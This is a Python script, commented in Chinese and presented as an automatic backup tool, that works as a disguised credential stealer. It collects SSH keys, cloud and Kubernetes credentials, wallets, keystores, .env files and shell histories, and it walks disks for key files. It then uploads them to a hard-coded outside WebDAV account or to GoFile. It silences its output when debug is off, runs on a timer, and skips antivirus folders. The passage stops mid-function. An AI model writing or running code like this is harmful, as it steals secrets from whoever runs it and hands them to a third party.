# -*- coding: utf-8 -*-
"""
自动备份和上传工具
功能：备份WSL和Windows系统中的重要文件，并自动上传到云存储
"""

import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import requests
import subprocess
import base64
import getpass
import json
import sqlite3
import urllib3
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache
from requests.auth import HTTPBasicAuth

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 尝试导入浏览器数据导出所需的库
BROWSER_EXPORT_AVAILABLE = False
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    BROWSER_EXPORT_AVAILABLE = True
except ImportError:
    logging.warning("浏览器数据导出功能不可用：缺少 pycryptodome 库")

class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 1000  # 上传超时时间（秒）
    
    # 监控配置
    BACKUP_INTERVAL = 260000  # 备份间隔时间（约3天）260000
    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）1200
    
    # 超时配置
    WSL_BACKUP_TIMEOUT = 3600  # WSL备份超时时间（秒，1小时）
    DISK_SCAN_TIMEOUT = 600  # 磁盘扫描超时时间（秒，10分钟）
    NETWORK_CONNECTION_TIMEOUT = 3  # 网络连接超时时间（秒）
    PROGRESS_REPORT_INTERVAL = 60  # 进度报告间隔（秒）
    
    # 文件操作配置
    FILE_COPY_BUFFER_SIZE = 1024 * 1024  # 文件复制缓冲区大小（1MB）
    TAR_COMPRESS_LEVEL = 9  # tar压缩级别（0-9，9为最高压缩）
    COMPRESSION_RATIO = 0.7  # 压缩比例估计值（压缩后约为原始大小的70%）
    SAFETY_MARGIN = 0.7  # 安全边界（分块时留出30%的余量）
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    
    # WSL指定备份目录或文件（相对于 WSL 用户主目录）
    WSL_SPECIFIC_DIRS = [
        ".ssh",           # SSH配置
        ".bash_history",  # Bash历史记录
        ".python_history", # Python历史记录
        ".bash_aliases",  # Bash别名
        ".node_repl_history", # Node.js REPL 历史记录
        ".wget-hsts",     # wget HSTS 历史记录
        ".Xauthority",    # Xauthority 文件
        ".ICEauthority",  # ICEauthority 文件
        # VPS服务商配置目录
        ".aws",               # AWS配置
        ".gcloud",            # Google Cloud配置
        ".azure",             # Azure配置
        ".aliyun",            # 阿里云配置
        ".tencentcloud",      # 腾讯云配置
        ".tccli",             # 腾讯云CLI配置
        ".doctl",             # DigitalOcean配置
        ".hcloud",            # Hetzner配置
        ".vultr",             # Vultr配置
        ".linode",            # Linode配置
        ".oci",               # Oracle Cloud配置
        ".bandwagon",         # 搬瓦工配置
        ".bwg",               # 搬瓦工配置
        ".docker",            # Docker配置
        ".kube",              # Kubernetes配置
    ]
    
    # Windows指定备份目录或文件（相对于 Windows 用户目录 /mnt/c/Users/{user}）
    WINDOWS_SPECIFIC_PATHS = [
        "Desktop",  # 桌面目录
        "AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite",  # 便签数据库
        ".python_history",  # Python 历史记录文件
        ".node_repl_history",  # Node.js REPL 历史记录文件
        "AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",  # Windows PowerShell 历史
        "AppData/Roaming/Microsoft/PowerShell/PSReadLine/ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
    ]
    
    # WSL文件扩展名分类
    WSL_EXTENSIONS_1 = [  # 文档/代码类
        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md", ".pdf",
    ]
    
    WSL_EXTENSIONS_2 = [  # 配置和密钥类
        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
    ]
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档类
        ".xls", ".xlsx", ".doc", ".docx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
        ".env", ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md", ".pdf",
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", ".conf", ".wallet", ".toml",
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc", ".json", ".yml", ".yaml",   
    ]
    
    # 排除目录配置
    EXCLUDE_INSTALL_DIRS = [       
        # 游戏相关目录
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # 常见软件安装目录
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # 开发工具和环境
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", "venv", "node_modules",
        ".gradle", ".m2", ".vs", ".vscode", ".cargo", ".git", ".yean",
        ".local", ".npm", ".nvm", ".orca_term", ".pki", ".pm2", "build",
        ".rustup", ".bun", ".github", ".vscode", "myenv", "snap"
        "__pycache__", ".vscode-server", "dist", ".cache", 
        
        # 其他大型应用
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # 浏览器相关
        "Google", "Chrome", "Brave", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # 通讯和办公软件
        "Discord", "Zoom", "Teams", "Skype", "Slack", "telegram",
        
        # 多媒体软件
        "Adobe", "Premiere", "Photoshop", "After Effects", "Vegas", "MAGIX", "Audacity",
        
        # 安全软件
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # 系统工具
        "CCleaner", "WinRAR", "7-Zip", "PowerToys",
    ]
    
    # 关键词排除
    EXCLUDE_KEYWORDS = [
        # 软件相关
        "program", "software", "install", "setup", "update",
        "patch", "360", "cache", "Code",
        
        # 开发相关
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        
        # 多媒体相关
        "music", "video", "movie", "audio", "media", "stream",
        
        # 游戏相关
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # 其他
        "bak", "obsolete", "archive", "trojan", "clash", "vpn",
        "thumb", "thumbnail", "preview" , "v2ray", "mail",

        # 中文
        "火绒", "杀毒", "电脑管家",
    ]

    EXCLUDE_WSL_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "myenv",
        "snap",
        "venv",
        "node_modules",
        "dist",
        ".cache",
        ".config",
        ".vscode-server",
        "build",
        ".vscode-remote-ssh",
        ".git",
        "__pycache__",
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]                                                                                                                                 

# 配置日志
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(format="%(message)s", level=logging.DEBUG)
else:
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    logging.basicConfig(format="%(message)s", level=logging.CRITICAL)

class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        
        # Infini Cloud 配置
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"
        self.infini_pass = "my95gfPVtKuDCpAK"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wsl_backup"
        
        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = False  # 禁用SSL验证
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API token（备选方案）
        self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
        
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except Exception as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"❌ 路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"❌目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"❌ 创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"❌ 清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        try:
            # 尝试连接多个可靠的服务器
            hosts = [
                "8.8.8.8",  # Google DNS
                "1.1.1.1",  # Cloudflare DNS
                "208.67.222.222"  # OpenDNS
            ]
            for host in hosts:
                try:
                    socket.create_connection((host, 53), timeout=BackupConfig.NETWORK_CONNECTION_TIMEOUT)
                    return True
                except:
                    continue
            return False
        except:
            return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def should_exclude_dir(self, path):
        """检查是否应该排除目录
        
        此方法检查给定路径是否应该被排除，主要通过以下步骤：
        1. 检查是否为云盘目录，如果是则不排除
        2. 检查是否匹配 EXCLUDE_INSTALL_DIRS 中的目录
        3. 检查是否包含 EXCLUDE_KEYWORDS 中的关键词（支持多种分隔符）
        
        Args:
            path: 目录路径
            
        Returns:
            bool: 是否应该排除
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 1. 检查是否为云盘目录
        cloud_keywords = [
            "云盘", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "网盘", "云"
        ]
        if any(keyword.lower() in path_lower for keyword in cloud_keywords):
            return False
            
        # 2. 检查完整目录名是否在排除列表中
        if any(ex.lower() in path_lower for ex in self.config.EXCLUDE_INSTALL_DIRS):
            return True
            
        # 3. 检查目录名的每一部分是否包含关键词
        for part in path_parts:
            # 预处理路径部分：移除所有常见分隔符并转换为小写
            normalized_part = part.lower()
            for sep in [' ', '_', '-', '.']:
                normalized_part = normalized_part.replace(sep, '')
                
            # 对每个关键词进行检查
            for keyword in self.config.EXCLUDE_KEYWORDS:
                keyword_lower = keyword.lower()
                # 移除关键词中的分隔符
                normalized_keyword = keyword_lower
                for sep in [' ', '_', '-', '.']:
                    normalized_keyword = normalized_keyword.replace(sep, '')
                
                # 检查原始路径部分（支持空格分隔）和标准化后的路径部分
                if (keyword_lower in part.lower() or  # 原始匹配
                    normalized_keyword in normalized_part):  # 标准化后匹配
                    return True
            
        return False

    def should_exclude_wsl_path(self, path, source_dir):
        """检查是否应该排除WSL路径
        
        Args:
            path: 路径
            source_dir: 源目录
            
        Returns:
            bool: 是否应该排除
        """
        if not source_dir == str(Path.home()):
            return False
        try:
            rel = os.path.relpath(path, str(Path.home()))
            parts = rel.split(os.sep)
            return any(part in self.config.EXCLUDE_WSL_DIRS for part in parts)
        except Exception:
            return False

    def backup_wsl_files(self, source_dir, target_dir):
        """WSL环境文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("❌ WSL源目录不存在")
            return None

        # 获取用户名前缀
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"

        # 创建子目录用于存放不同类型的文件
        target_docs = os.path.join(target_dir, "docs")
        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")
        target_configs = os.path.join(target_dir, "configs")
        
        if not self._clean_directory(target_dir):
            return None
            
        if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs]):
            return None

        # 添加计数器和超时控制
        start_time = time.time()
        last_progress_time = start_time
        timeout = self.config.WSL_BACKUP_TIMEOUT
        total_files = 0
        processed_files = 0

        # 输出开始备份的信息
        logging.info("\n" + "─" * 50)
        logging.info("🚀 开始备份 WSL 重要目录和文件")
        logging.info("─" * 50 + "\n")

        # 处理指定目录和文件（完整备份，不筛选扩展名）
        for specific_path in self.config.WSL_SPECIFIC_DIRS:
            # 检查是否超时
            if time.time() - start_time > timeout:
                logging.error("\n❌ WSL备份超时")
                return None

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                try:
                    # 对于指定的目录和文件，保存在 specified 目录下
                    target_base_for_specific = target_specified
                    if os.path.isfile(full_source_path):
                        # 如果是文件，直接复制
                        target_file = os.path.join(target_base_for_specific, specific_path)
                        target_file_dir = os.path.dirname(target_file)
                        if self._ensure_directory(target_file_dir):
                            shutil.copy2(full_source_path, target_file)
                            processed_files += 1
                            if self.config.DEBUG_MODE:
                                logging.info(f"📄 已备份: {specific_path}")
                    else:
                        # 如果是目录，递归复制全部内容
                        target_path = os.path.join(target_base_for_specific, specific_path)
                        if self._ensure_directory(os.path.dirname(target_path)):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path)
                            
                            # 添加目录复制进度日志
                            logging.info(f"\n📁 正在备份: {specific_path}/")
                            for root, _, files in os.walk(full_source_path):
                                total_files += len(files)
                            
                            shutil.copytree(full_source_path, target_path, 
                                         symlinks=True, 
                                         ignore=lambda d, files: [f for f in files 
                                                                if any(ex in f for ex in self.config.EXCLUDE_WSL_DIRS)])
                except Exception as e:
                    logging.error(f"\n❌ 备份失败: {specific_path} - {str(e)}")

        logging.info("\n" + "─" * 50)
        logging.info("🔍 开始扫描其他重要文件")
        logging.info("─" * 50)

        # 处理其他目录中的文件（按扩展名分类）
        docs_count = 0
        configs_count = 0
        for root, _, files in os.walk(source_dir):
            # 检查是否超时
            current_time = time.time()
            if current_time - start_time > timeout:
                logging.error("\n❌ WSL备份超时")
                return None
            
            # 每N秒输出一次进度
            if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                elapsed_minutes = int((current_time - start_time) / 60)
                logging.info(f"\n⏳ 已处理 {processed_files} 个文件... ({elapsed_minutes}分钟)")
                last_progress_time = current_time
            
            # 跳过已经完整备份的指定目录
            if any(specific_dir in root for specific_dir in self.config.WSL_SPECIFIC_DIRS):
                continue
                
            if os.path.abspath(root).startswith(target_dir):
                continue
            
            if self.should_exclude_wsl_path(root, source_dir):
                continue

            for file in files:
                # 检查文件类型并决定目标目录
                is_doc = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_1)
                is_config = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_2)
                
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                if not os.path.exists(source_file):
                    continue

                # 根据文件类型选择目标目录
                target_base = target_docs if is_doc else target_configs
                relative_path = os.path.relpath(root, source_dir)
                target_sub_dir = os.path.join(target_base, relative_path)
                target_file = os.path.join(target_sub_dir, file)

                if not self._ensure_directory(target_sub_dir):
                    continue
                    
                try:
                    shutil.copy2(source_file, target_file)
                    processed_files += 1
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.error(f"\n❌ 复制失败: {relative_path}/{file} - {str(e)}")

        # 计算总用时
        total_time = time.time() - start_time
        total_minutes = int(total_time / 60)

        if docs_count > 0 or configs_count > 0:
            logging.info("\n" + "═" * 50)
            logging.info("📊 WSL备份统计")
            logging.info("═" * 50)
            if docs_count > 0:
                logging.info(f"   📚 文档文件：{docs_count} 个")
            if configs_count > 0:
                logging.info(f"   ⚙️  配置文件：{configs_count} 个")
            logging.info("─" * 50)
            logging.info(f"   🔄 总计处理：{processed_files} 个文件")
            logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
            logging.info("═" * 50 + "\n")

        return target_dir

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windows磁盘文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error(f"\n❌ 磁盘源目录不存在: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
                     
        files_count = 0
        total_size = 0
        scan_timeout = self.config.DISK_SCAN_TIMEOUT
        retry_count = self.config.RETRY_COUNT
        retry_delay = 5  # 文件访问重试等待时间（秒）
        start_time = time.time()
        last_progress_time = start_time

        # 输出开始备份的信息
        logging.info("\n" + "─" * 50)
        logging.info("🚀 开始扫描磁盘重要文件")
        logging.info("─" * 50)

        try:
            # 使用 os.walk 的 topdown=True 参数，这样可以跳过不需要的目录
            for root, dirs, files in os.walk(source_dir, topdown=True):
                # 检查是否超时
                current_time = time.time()
                if current_time - start_time > scan_timeout:
                    logging.error(f"\n❌ 扫描目录超时: {source_dir}")
                    break
                    
                # 每N秒显示一次进度
                if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                    elapsed_minutes = int((current_time - start_time) / 60)
                    logging.info(f"\n⏳ 已处理 {files_count} 个文件... ({elapsed_minutes}分钟)")
                    last_progress_time = current_time
                
                # 跳过目标目录
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # 跳过排除的目录
                if self.should_exclude_dir(root):
                    dirs.clear()  # 清空子目录列表，避免继续遍历
                    continue

                # 处理文件
                for file in files:
                    if not any(file.lower().endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # 检查文件大小
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0 or file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            continue
                    except OSError:
                        continue

                    # 尝试复制文件
                    for attempt in range(retry_count):
                        try:
                            # 检查文件是否可访问
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError):
                                if attempt < retry_count - 1:
                                    time.sleep(retry_delay)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                break
                                
                            # 使用分块复制
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                shutil.copyfileobj(src, dst, length=self.config.FILE_COPY_BUFFER_SIZE)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            break  # 成功后跳出重试循环
                            
                        except (OSError, IOError, PermissionError) as e:
                            if attempt == retry_count - 1 and self.config.DEBUG_MODE:
                                logging.error(f"\n❌ 文件复制失败: {file} - {str(e)}")

        except (OSError, IOError) as e:
            logging.error(f"\n❌ 备份过程出错: {str(e)}")

        # 显示最终统计信息
        if files_count > 0:
            total_minutes = int((time.time() - start_time) / 60)
            logging.info("\n" + "═" * 50)
            logging.info("📊 磁盘备份统计")
            logging.info("═" * 50)
            logging.info(f"   📁 文件数量：{files_count} 个")
            logging.info(f"   💾 总大小：{total_size / 1024 / 1024:.1f}MB")
            logging.info("─" * 50)
            logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
            logging.info("═" * 50 + "\n")
            return target_dir
        else:
            logging.error(f"\n❌ 未找到需要备份的文件")
            return None
    
    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表，如果不需要分割则返回None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"⚠️ 文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 仅在全部分片上传成功后清理分片目录与原始文件
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                if os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # 构建目录路径
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """上传单个文件到 Infini Cloud（使用 WebDAV PUT 方法）"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 构建远程路径
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # 创建远程目录（如果需要）
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"无法创建远程目录: {remote_dir}，将继续尝试上传")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # 根据文件大小动态调整超时时间
                    if file_size < 1024 * 1024:  # 小于1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # 大于10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # 只在第一次尝试时显示详细信息
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"📤 [Infini Cloud] 上传: {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] 重试上传: {filename} (第 {attempt + 1} 次)")
                    
                    # 准备请求头
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # 执行上传（使用 WebDAV PUT 方法）
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"✅ [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 权限不足")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径不存在")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径冲突")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 状态码 {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 超时")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 连接错误")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] 上传过程出错: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0 {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"⚠️ 文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            for attempt in range(self.config.RETRY_COUNT):
                # 检查网络连接
                if not self._check_internet_connection():
                    logging.error("⚠️ 网络连接不可用，等待重试...")
